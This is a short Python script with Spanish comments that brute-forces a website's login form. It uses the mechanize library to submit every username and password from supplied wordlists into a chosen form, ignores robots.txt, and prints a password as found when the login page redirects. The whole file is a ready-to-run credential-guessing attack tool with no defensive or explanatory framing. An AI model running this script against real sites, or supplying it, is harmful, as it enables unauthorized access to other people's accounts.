import mechanize
import argparse
from colorama import Fore,init

arg = argparse.ArgumentParser()
arg.add_argument('-url',type=str)
arg.add_argument('-c_u',type=str)
arg.add_argument('-c_p',type=str)
arg.add_argument('-u','--usuario',type=str)
arg.add_argument('-dic_p',type=str)
arg.add_argument('-dic_u',type=str)
arg.add_argument('-n',type=int)

param= arg.parse_args()

init()
if param.n != None:
    n = param.n
else:
    n = 0

def fb(url,usuario,c_usuario,c_pass,pass_,n):
    #url --> url de la pagina web
    #usuario --> si conozco el usuario se almacena aca
    #c_pass --> atriqueta name de html de contraseña
    #c_usuario --> atriqueta name de html de usuario
    #n --> numero de formulario
    try:
        web = mechanize.Browser()
        encabezado = [
            ('Accept', 'text/javascript, text/html, application/xml, text/xml, */*'),
            ('Content-type', 'application/x-www-form-urlencoded; charset=UTF-8'),
            ('User-Agent', 'Foobar'),
        ]

        web.set_handle_robots(False)
        web.addhandlers = encabezado

        web.open(url)

        web.select_form(nr=n)
        web[c_usuario] = usuario
        web[c_pass] = pass_

        pag2= web.submit()
        
        if str(pag2.geturl()).split('?')[0] != url:
            print(Fore.GREEN+f'contraseña encontrada: {pass_}')
            
    except mechanize.ControlNotFoundError:
        print(Fore.RED+'no se encuentra el formulario o las casillas no conciden')

#conozco el usuario
if param.usuario != None:
    with open(param.dic_p,'r') as contraseñas:
        passw = contraseñas.read()
    for cont in passw.split():
        fuerza_b= fb(url=param.url,usuario=param.usuario,c_usuario=param.c_u,c_pass=param.c_p,pass_=cont,n=n)
        
#no conozco el usuario 
elif param.dic_u != None:
    with open(param.dic_u,'r') as usuarios:
        us = usuarios.read()
    with open(param.dic_p) as contraseñas:
        passw = contraseñas.read()

    for usuario  in us.split():
        for contraseña  in passw.split():
            fb(url=param.url,usuario=usuario,c_usuario=param.c_u,c_pass=param.c_p,pass_=contraseña,n=n)

